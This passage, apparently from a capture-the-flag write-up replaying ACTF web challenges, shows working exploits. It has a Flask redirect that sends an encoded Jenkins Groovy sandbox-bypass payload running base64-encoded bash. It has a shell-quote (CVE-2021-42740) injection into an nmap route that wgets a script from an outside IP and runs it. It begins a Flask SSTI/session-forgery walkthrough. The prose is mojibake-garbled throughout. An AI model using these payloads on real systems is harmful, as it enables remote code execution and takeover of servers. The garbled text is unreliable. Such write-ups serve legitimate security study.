class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆexp,ğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ(exloit)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/evil&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evil</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;http://124.70.33.170:8088/redirect?redirect_url=%68%74%74%70%3a%2f%2f%6a%65%6e%6b%69%6e%73%3a%38%30%38%30%2f%73%65%63%75%72%69%74%79%52%65%61%6c%6d%2f%75%73%65%72%2f%61%64%6d%69%6e%2f%64%65%73%63%72%69%70%74%6f%72%42%79%4e%61%6d%65%2f%6f%72%67%2e%6a%65%6e%6b%69%6e%73%63%69%2e%70%6c%75%67%69%6e%73%2e%73%63%72%69%70%74%73%65%63%75%72%69%74%79%2e%73%61%6e%64%62%6f%78%2e%67%72%6f%6f%76%79%2e%53%65%63%75%72%65%47%72%6f%6f%76%79%53%63%72%69%70%74%2f%63%68%65%63%6b%53%63%72%69%70%74%3f%73%61%6e%64%62%6f%78%3d%74%72%75%65%26%76%61%6c%75%65%3d%25%37%30%25%37%35%25%36%32%25%36%63%25%36%39%25%36%33%25%32%30%25%36%33%25%36%63%25%36%31%25%37%33%25%37%33%25%32%30%25%37%38%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%37%30%25%37%35%25%36%32%25%36%63%25%36%39%25%36%33%25%32%30%25%37%38%25%32%38%25%32%39%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%32%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%33%25%32%30%25%37%62%25%36%35%25%36%33%25%36%38%25%36%66%25%32%63%25%35%39%25%36%64%25%34%36%25%37%61%25%36%31%25%34%33%25%34%31%25%37%34%25%36%31%25%35%33%25%34%31%25%32%62%25%34%61%25%36%39%25%34%31%25%37%36%25%35%61%25%34%37%25%35%36%25%33%32%25%34%63%25%33%33%25%35%32%25%36%61%25%36%33%25%34%33%25%33%38%25%33%30%25%34%64%25%37%39%25%33%34%25%37%38%25%34%65%25%34%34%25%34%64%25%37%35%25%34%64%25%35%34%25%36%62%25%37%39%25%34%63%25%36%61%25%34%35%25%33%35%25%34%63%25%37%61%25%34%35%25%37%38%25%34%65%25%34%34%25%35%35%25%36%37%25%34%64%25%34%34%25%33%34%25%36%64%25%34%64%25%35%31%25%33%64%25%33%64%25%37%64%25%37%63%25%37%62%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%63%25%32%64%25%36%34%25%37%64%25%37%63%25%37%62%25%36%32%25%36%31%25%37%33%25%36%38%25%32%63%25%32%64%25%36%39%25%37%64%25%32%32%25%32%65%25%36%35%25%37%38%25%36%35%25%36%33%25%37%35%25%37%34%25%36%35%25%32%38%25%32%39%25%30%61%25%32%30%25%32%30%25%37%64%25%30%61%25%37%64&quot;</span>,code=<span class="number">302</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">7777</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031083826.png" alt="å¾®ä¿¡æˆªå›¾_20231031083826"></p><p>å“ˆå“ˆå“ˆå“ˆå“ˆ!æ¬ºéª—ä¸–ç•Œè¿™ç§äº‹æƒ…,å¯¹äºğŸ‘´æ¥è¯´,ç®€ç›´å°èœä¸€ç¢Ÿ.</p><p>ã‚ãŸã—ã¯å¼·ã„ã€€ã‚ãªãŸãŸã¡ã‚ˆã‚Šå¼·ã„ï¼</p><p>è¿™ä¸€åˆ‡éƒ½æ˜¯å‘½è¿çŸ³ä¹‹é—¨çš„é€‰æ‹©!</p><h1 id="~ave-mujicas-masquerade~"><span id="~ave-mujicas-masquerade~"> ~Ave Mujicaâ€™s Masquerade~</span></h1><p>ã€ŒãŠå¹¸ã›ã«ã€,å¸Œå•Šå“‡èµ›ä½ å¦¹çš„,ğŸ‘´å¾ˆğŸ˜¡ğŸ˜¡.</p><h2 id="æºç å†²"><span id="æºç å†²"> æºç ,å†²ğŸ˜“</span></h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/checker&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> url = req.<span class="property">query</span>.<span class="property">url</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (url) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> host;</span><br><span class="line">    <span class="keyword">let</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MakE it Safer!!!!! </span></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="title function_">includes</span>(<span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">const</span> parts = url.<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">      host = parts[<span class="number">0</span>];</span><br><span class="line">      port = parts.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      host = url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (port) &#123;</span><br><span class="line">      command = shellQuote.<span class="title function_">quote</span>([<span class="string">&quot;nmap&quot;</span>, <span class="string">&quot;-p&quot;</span>, port, host]); <span class="comment">// Construct the shell command</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      command = shellQuote.<span class="title function_">quote</span>([<span class="string">&quot;nmap&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="string">&quot;80&quot;</span>, host]);</span><br><span class="line">    &#125;</span><br><span class="line">    nmap = <span class="title function_">spawn</span>(<span class="string">&quot;bash&quot;</span>, [<span class="string">&quot;-c&quot;</span>, command]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(command);</span><br><span class="line">    </span><br><span class="line">    nmap.<span class="title function_">on</span>(<span class="string">&#x27;exit&#x27;</span>, <span class="keyword">function</span> (<span class="params">code</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;child process exited with code &#x27;</span> + code.<span class="title function_">toString</span>());</span><br><span class="line">      <span class="keyword">if</span> (code !== <span class="number">0</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Error executing command!!!`</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Ok...`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;No parameter provided.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ä¸å¤šbb,å°±æ˜¯æ‰“è¿™ä¸ªcheckerè·¯ç”±.</p><p>ğŸ‘´è§‰å¾—shellQuote,quoteå¾ˆé™Œç”Ÿ,å¾ˆä¸å¯¹åŠ²,æ€ä¹ˆåŠ,æœexp!</p><p>åˆ«è·ŸğŸ‘´è¯´ä½ ä¸ä¼šæœ,nmdä¸è¦ç”¨å›½å†…çš„ç­”è¾©å¼•æ“,ä¸ŠğŸ¥ğŸ•Šç›´æ¥:shellQuote exploit</p><p>ç¬¬ä¸€ä¸ªå°±æ˜¯äº†,å…¶å®ƒéƒ½ä¸å¥½ä½¿:<a href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">Exploiting CVE-2021-42740 (wh0.github.io)</a></p><p>ä¸è¯´äººè¯:shell-quote åŒ…é€šå¸¸ç”¨äºè½¬ä¹‰ä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œä»¥ä¾¿åœ¨ shell å‘½ä»¤ä¸­ä½¿ç”¨ã€‚æ­¤ç¤ºä¾‹é‡‡ç”¨ä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œå¼•ç”¨å®ƒï¼Œå¹¶é€šè¿‡ä¸€ä¸ªå‘½ä»¤è¿è¡Œå®ƒï¼Œè¯¥å‘½ä»¤å°†å…¶æ‰“å°å‡ºæ¥ã€‚æˆ‘ä»¬åªå¸Œæœ›å®ƒè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯å…è®¸ä¸å—ä¿¡ä»»çš„è¾“å…¥è¿è¡Œä»»æ„å‘½ä»¤ã€‚å‡è®¾æˆ‘ä»¬åœ¨è·¯å¾„ä¸­è°ƒç”¨ pwnme äº†è¿™ä¸ªç¨‹åºï¼Œå¦‚æœå®ƒè¢«æ‰§è¡Œï¼Œæˆ‘ä»¬å°±å¤±è´¥äº†æˆ‘ä»¬çš„å®‰å…¨ç›®æ ‡ï¼š</p><p>æœ‰ç‚¹éš¾æ‡‚,æ¥ä¸ªdemoè¯•ä¸€ä¸‹.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title class_">String</span>(s).<span class="title function_">replace</span>(<span class="regexp">/([A-z]:)?([#!&quot;$&amp;&#x27;()*,:;&lt;=&gt;?@\[\\\]^`&#123;|&#125;])/g</span>, <span class="string">&#x27;$1\\$2&#x27;</span>);</span><br></pre></td></tr></table></figure><p>æœ€å¥½åœ¨è™šæ‹Ÿæœºä¸Šç”¨,test.jså¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> childProcess = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellQuote = <span class="built_in">require</span>(<span class="string">&#x27;shell-quote&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> untrusted = process.<span class="property">argv</span>[<span class="number">2</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;untrusted&#x27;</span>, untrusted);</span><br><span class="line"><span class="keyword">const</span> result = childProcess.<span class="title function_">execSync</span>(shellQuote.<span class="title function_">quote</span>([<span class="string">&#x27;printf&#x27;</span>, <span class="string">&#x27;%s\n&#x27;</span>, untrusted]));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;result&#x27;</span>, result);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node test.<span class="property">js</span> <span class="string">&#x27;`:`./pwnme``:`&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;`:`pwnme``:`&#x27;</span></span><br></pre></td></tr></table></figure><p>ç›¸å½“äºuntrsuted,ğŸ‘´ç›´æ¥å°±è¯´äº†.</p><p>pwnmeè¾“å…¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!<span class="regexp">/bin/</span>sh</span><br><span class="line">touch /tmp/i-am-pwned</span><br><span class="line">echo <span class="string">&quot;oh no&quot;</span></span><br></pre></td></tr></table></figure><p>è¾“å…¥å‘½ä»¤</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node test.<span class="property">js</span> <span class="string">&#x27;`:`./pwnme``:`&#x27;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥å°±èƒ½æ‰§è¡Œpwnmeé‡Œé¢çš„å†…å®¹äº†</p><p>ç©ºæ ¼è¢«banæ€ä¹ˆåŠ,ç”¨$IFS,åˆ«è¿™ä¹Ÿè¦ğŸ‘´æ•™.</p><p>ä½ ç°åœ¨æ˜ç™½äº†æ€ä¹ˆç»˜ä¸–äº†.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command = shellQuote.<span class="title function_">quote</span>([<span class="string">&quot;nmap&quot;</span>, <span class="string">&quot;-p&quot;</span>, port, host]);</span><br></pre></td></tr></table></figure><p>ç°åœ¨ä¹Ÿå°±æ˜¯è¦æ§åˆ¶<code>port</code>äº†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;127.0.0.1:`:`wget$IFS``:`</span></span><br></pre></td></tr></table></figure><p>$IFS</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">20</span>%<span class="number">09</span>%0A%<span class="number">00</span>%0A</span><br></pre></td></tr></table></figure><p>$9</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">09</span></span><br></pre></td></tr></table></figure><p>å…ˆä¸‹è½½</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`wget$IFS$943.143.192.19:7777/a.sh``:`</span></span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031150210.png" alt="å¾®ä¿¡æˆªå›¾_20231031150210"></p><p>æŠ¥é”™å¹¶æ— å…³ç³»,å·²ç»æ‰§è¡ŒåŠ›.</p><p>å†æ‰§è¡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`bash$IFS$9a.sh``:`</span></span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031150159.png" alt="å¾®ä¿¡æˆªå›¾_20231031150159"></p><p>èŠœæ¹–,å¥¥åˆ©å®‰è´¹,å¤ªtmçˆ½äº†.</p><p>ğŸ‘´é¡ºä¾¿è¯´ä¸€ä¸‹,ç”¨æ–œæ ä¹Ÿèƒ½ç»•è¿‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`bash$IFS\a.sh``:`</span></span><br></pre></td></tr></table></figure><h1 id="story"><span id="story"> story</span></h1><p>ã“ã‚Œã¯ã€ã‚ãŸã—ã®ç‰©èªğŸ¤£,wcsndmé¢˜ç›®ç¯å¢ƒæ²¡äº†,è‡ªå·±æœ¬åœ°æ­docker.</p><p>ä¸è¿‡é—®é¢˜ä¸å¤§,å› ä¸ºğŸ‘´é­”æ”¹äº†ä¸€ä¸‹æºç ,ä¸€æ ·èƒ½å’Œé¢˜ç›®æ•ˆæœå·®ä¸å¤š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4())</span><br></pre></td></tr></table></figure><p>ä¸ºäº†ä¿è¯é¢˜ç›®å¯†é’¥çš„éšæœºæ€§,ğŸ‘´æ”¹æˆäº†è¿™bç©æ„,ğŸ‘´å¯å¤ªnbäº†</p><p>ä¸å¤šbb,å…ˆä¸Šæºç ,è®©ğŸ‘´æ¥çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ğŸ˜Š</p><h2 id="æºç "><span id="æºç "> æºç ğŸ¤”</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">captcha</span>():</span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>)</span><br><span class="line">    buf , captcha_text = gen.generate()</span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;captcha&#x27;</span>] = captcha_text</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue(), <span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;image/png&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(buf.getvalue()))</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/vip&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vip</span>():</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    captcha_user = request.json.get(<span class="string">&#x27;captcha&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> captcha == captcha_user:</span><br><span class="line">        session[<span class="string">&#x27;vip&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;home.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/story&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">story</span>():</span><br><span class="line">    story = session.get(<span class="string">&#x27;story&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> story <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> story != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        tpl = <span class="built_in">open</span>(<span class="string">&#x27;templates/story.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">return</span> render_template_string(tpl % story) </span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/write&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    story = request.json.get(<span class="string">&#x27;story&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;vip&#x27;</span>, <span class="string">&#x27;&#x27;</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> minic_waf(story):</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line">            session[<span class="string">&#x27;vip&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;no way~~~&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        session[<span class="string">&#x27;story&#x27;</span>] = story</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Please become a VIP first.&#x27;</span>&#125;), <span class="number">400</span></span><br></pre></td></tr></table></figure><p>ğŸ‘´åªæ”¾äº†ä¸‰ä¸ªè·¯ç”±,ä¸æ˜¯æ‡’,è€Œæ˜¯æ²¡æœ‰å¿…è¦,ä½ ç”¨ä¸ç€è¿™ä¹ˆå¤šäº†ğŸ¤£</p><p>å¾ˆæ˜æ˜¾,æœ€ç»ˆåˆ©ç”¨ç‚¹å°±æ˜¯storyè·¯ç”±ä¸‹çš„render_template_string,ä¼—æ‰€å‘¨çŸ¥,è¿™æ˜¯SSTIçš„è§¦å‘ç‚¹.</p><p>ä½†æ˜¯å‚æ•°æ˜¯ä»sessioné‡Œé¢å–å‡ºæ¥çš„,ä½ èƒ½ä¼ªé€ å—,é‚£æ€ä¹ˆè¯´ä¹Ÿå¾—æ‹¿åˆ°SECRET_KEYå•Š,æ€ä¹ˆæ‹¿åˆ°å‘¢,é€šè¿‡stroyè·¯ç”±sstiæ‹¿åˆ°,é‚£æˆ‘æ€ä¹ˆssti,å…ˆä¼ªé€ session,é‚£æˆ‘æ€ä¹ˆä¼ªé€ session,å…ˆæ‹¿åˆ°SECRET_KEY,é‚£æˆ‘æ€ä¹ˆæ‹¿åˆ°SCECRET_KEYå‘¢,å…ˆsstiâ€¦</p><p>å‘çˆ¹å‘¢!è¿™æ˜¯,ğŸ˜“(bushi)</p><p>å¥½å§,æ­£è§£å…¶å®æ˜¯:</p><p>é€šè¿‡writeè·¯ç”±å†™sessionçš„story,ä½†æ˜¯writeè·¯ç”±åˆ©ç”¨æœ‰ä¸ªæ¡ä»¶,è¦ä¼ªé€ vip,é‚£æ€ä¹ˆä¼ªé€ vip,é‚£å¿…ç„¶æ˜¯å…ˆæ‹¿åˆ°SECRET_KEYâ€¦æˆ‘è¯´å©·å©·,æ‰“ä½,æ²¡å®Œäº†æ˜¯å§ğŸ¤ª.</p><p>vipè·¯ç”±ä¸‹èƒ½å¤Ÿè®©æˆ‘ä»¬sessionä¸­çš„vipä¸ºtrue</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vip</span>():</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    captcha_user = request.json.get(<span class="string">&#x27;captcha&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> captcha == captcha_user:</span><br><span class="line">        session[<span class="string">&#x27;vip&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;home.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/story&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡æ¡ä»¶æ˜¯generate_codeç­‰äºä¼ å…¥çš„captcha,è€Œgenerate_codeçš„ç”Ÿæˆé€»è¾‘æ˜¯éšæœºçš„å››ä½,è€Œä¸”æ¯è®¿é—®ä¸€æ¬¡éƒ½ä¼šå˜,ç›´æ¥çˆ†ç ´çš„äººå»ºè®®é­”æ³•æŠ«é£.</p><p>æˆ‘çœ‹çœ‹è¿™ä¸ªcaptchaçš„ç”Ÿæˆæ˜¯æ€ä¹ˆä¸ªäº‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_code</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">4</span></span>):</span><br><span class="line">    characters = <span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br></pre></td></tr></table></figure><p>è¿™ç©ä¸ªpå•Š,éšæœºç”Ÿæˆ,æˆ‘çœ‹çœ‹è¿™ä¸ªclassæ€ä¹ˆä¸ªäº‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 